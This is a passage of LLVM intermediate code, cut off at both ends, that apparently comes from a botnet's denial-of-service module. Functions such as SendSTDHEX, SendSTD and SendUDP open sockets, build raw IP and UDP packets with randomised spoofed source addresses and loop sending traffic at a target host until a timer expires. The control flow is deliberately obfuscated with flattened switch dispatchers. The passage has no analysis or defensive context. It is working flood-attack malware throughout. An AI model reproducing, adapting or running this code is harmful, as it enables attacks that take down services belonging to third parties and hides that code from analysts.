  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 1474471522, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1474471522, label %6
    i32 -1486009647, label %10
    i32 1765440584, label %19
    i32 -839202224, label %23
    i32 -1823608145, label %30
    i32 1129827825, label %31
    i32 1542893262, label %36
    i32 320962753, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -1486009647, i32 1765440584
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 1474471522, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 -839202224, i32 -1823608145
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 -1823608145, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 1129827825, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 1542893262, i32 320962753
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 1129827825, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 931035829, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 931035829, label %first
    i32 984392526, label %7
    i32 1097445262, label %8
    i32 323036741, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 984392526, i32 1097445262
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 323036741, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 323036741, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTDHEX(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8*], align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %13, i32* %7, align 4
  %14 = call i64 @time(i64* null) #5
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #5
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 -1527260468, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1527260468, label %37
    i32 516525787, label %42
    i32 547554860, label %57
    i32 2045648603, label %60
    i32 -918226158, label %61
    i32 372617308, label %64
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = bitcast [1 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %38, i8* bitcast ([1 x i8*]* @SendSTDHEX.hexstring to i8*), i64 8, i32 8, i1 false)
  %39 = load i32, i32* %11, align 4
  %40 = icmp uge i32 %39, 50
  %41 = select i1 %40, i32 516525787, i32 -918226158
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %7, align 4
  %44 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i32 0, i32 0
  %45 = bitcast i8** %44 to i8*
  %46 = call i64 @send(i32 %43, i8* %45, i64 1460, i32 0)
  %47 = load i32, i32* %7, align 4
  %48 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %49 = call i32 @connect(i32 %47, %struct.sockaddr* %48, i32 16)
  %50 = call i64 @time(i64* null) #5
  %51 = load i64, i64* %8, align 8
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = icmp sge i64 %50, %54
  %56 = select i1 %55, i32 547554860, i32 2045648603
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %7, align 4
  %59 = call i32 @close(i32 %58)
  call void @_exit(i32 0) #11
  unreachable

; <label>:60:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -918226158, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %11, align 4
  %63 = add i32 %62, 1
  store i32 %63, i32* %11, align 4
  store i32 -1527260468, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %61, %60, %42, %37, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [26 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 1724659735, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1724659735, label %38
    i32 -108478019, label %48
    i32 2034384193, label %62
    i32 -1044389616, label %65
    i32 975965509, label %66
    i32 161994270, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = bitcast [26 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([26 x i8*]* @SendSTD.randstrings to i8*), i64 208, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 26
  %43 = getelementptr inbounds [26 x i8*], [26 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  %47 = select i1 %46, i32 -108478019, i32 975965509
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 69, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i64 @time(i64* null) #5
  %56 = load i64, i64* %8, align 8
  %57 = load i32, i32* %6, align 4
  %58 = sext i32 %57 to i64
  %59 = add nsw i64 %56, %58
  %60 = icmp sge i64 %55, %59
  %61 = select i1 %60, i32 2034384193, i32 -1044389616
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #11
  unreachable

; <label>:65:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 975965509, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %11, align 4
  store i32 1724659735, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %66, %65, %48, %38, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1640455454, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1640455454, label %first
    i32 1474509546, label %28
    i32 1399340744, label %32
    i32 680907667, label %37
    i32 -702515247, label %43
    i32 -192588815, label %44
    i32 -1437185406, label %52
    i32 1642747590, label %53
    i32 97673299, label %59
    i32 -179568204, label %60
    i32 1434726900, label %61
    i32 -1381071462, label %66
    i32 1167731511, label %73
    i32 -166991226, label %118
    i32 -2084820887, label %120
    i32 -25278375, label %125
    i32 325690342, label %152
    i32 1630552519, label %153
    i32 1754212055, label %166
    i32 -1851134834, label %168
    i32 1217435941, label %173
    i32 1180406060, label %200
    i32 525827683, label %206
    i32 -657690246, label %207
    i32 -78824597, label %208
    i32 -2055213205, label %211
    i32 169162808, label %213
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 0
  %27 = select i1 %26, i32 1474509546, i32 1399340744
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  store i32 680907667, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %8, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 680907667, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %7, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %40 = call i32 @getHost(i8* %38, %struct.in_addr* %39)
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 -702515247, i32 -192588815
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 169162808, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 8, i32 4, i1 false)
  %47 = load i32, i32* %11, align 4
  store i32 %47, i32* %14, align 4
  %48 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %48, i32* %15, align 4
  %49 = load i32, i32* %15, align 4
  %50 = icmp ne i32 %49, 0
  %51 = select i1 %50, i32 1642747590, i32 -1437185406
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 169162808, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  %54 = load i32, i32* %15, align 4
  %55 = bitcast i32* %16 to i8*
  %56 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* %55, i32 4) #5
  %57 = icmp slt i32 %56, 0
  %58 = select i1 %57, i32 97673299, i32 -179568204
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 169162808, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 50, i32* %17, align 4
  store i32 1434726900, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %17, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %17, align 4
  %64 = icmp ne i32 %62, 0
  %65 = select i1 %64, i32 -1381071462, i32 1167731511
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = call i64 @time(i64* null) #5
  %68 = call i32 @rand_cmwc()
  %69 = zext i32 %68 to i64
  %70 = xor i64 %67, %69
  %71 = trunc i64 %70 to i32
  call void @srand(i32 %71) #5
  %72 = call i32 @rand() #5
  call void @init_rand(i32 %72)
  store i32 1434726900, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %12, align 4
  %75 = sub nsw i32 32, %74
  %76 = shl i32 1, %75
  %77 = sub nsw i32 %76, 1
  %78 = xor i32 %77, -1
  store i32 %78, i32* %18, align 4
  %79 = load i32, i32* %10, align 4
  %80 = sext i32 %79 to i64
  %81 = add i64 28, %80
  store i64 %81, i64* %.reg2mem2
  %82 = call i8* @llvm.stacksave()
  store i8* %82, i8** %19, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %83 = alloca i8, i64 %.reload4, align 16
  store i8* %83, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %84 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = bitcast %struct.iphdr* %85 to i8*
  %87 = getelementptr i8, i8* %86, i64 20
  %88 = bitcast i8* %87 to %struct.udphdr*
  store %struct.udphdr* %88, %struct.udphdr** %21, align 8
  %89 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %90, i32 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = load i32, i32* %18, align 4
  %94 = call i32 @getRandomIP(i32 %93)
  %95 = call i32 @htonl(i32 %94) #10
  %96 = load i32, i32* %10, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 8, %97
  %99 = trunc i64 %98 to i32
  call void @makeIPPacket(%struct.iphdr* %89, i32 %92, i32 %95, i8 zeroext 17, i32 %99)
  %100 = load i32, i32* %10, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 8, %101
  %103 = trunc i64 %102 to i16
  %104 = call zeroext i16 @htons(i16 zeroext %103) #10
  %105 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %106 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.1* %106 to %struct.anon.2*
  %108 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %107, i32 0, i32 2
  store i16 %104, i16* %108, align 2
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %112 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %111, i32 0, i32 0
  %113 = bitcast %union.anon.1* %112 to %struct.anon.2*
  %114 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %113, i32 0, i32 0
  store i16 %110, i16* %114, align 2
  %115 = load i32, i32* %8, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 -166991226, i32 -2084820887
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @rand_cmwc()
  store i32 -25278375, i32* %switchVar
  store i32 %119, i32* %.reg2mem10
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %8, align 4
  %122 = trunc i32 %121 to i16
  %123 = call zeroext i16 @htons(i16 zeroext %122) #10
  %124 = zext i16 %123 to i32
  store i32 -25278375, i32* %switchVar
  store i32 %124, i32* %.reg2mem10
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
